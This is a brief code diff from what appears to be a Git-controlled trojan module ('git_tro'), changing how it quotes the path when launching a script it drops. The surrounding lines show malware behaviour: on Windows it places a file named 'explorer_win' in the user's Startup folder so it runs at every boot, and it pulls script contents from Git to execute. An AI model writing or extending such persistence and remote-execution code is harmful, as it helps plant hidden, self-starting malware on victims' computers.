@@ -51,7 +51,7 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 		if winRunOnBoot == True:
 			TargetScript = os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup\\explorer_win"
 
-		cmd = ScriptExec+" "+TargetScript
+		cmd = ScriptExec+" '"+TargetScript+"'"
 	else:
 		return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)
 	script	= get_file_contents(scriptPath)
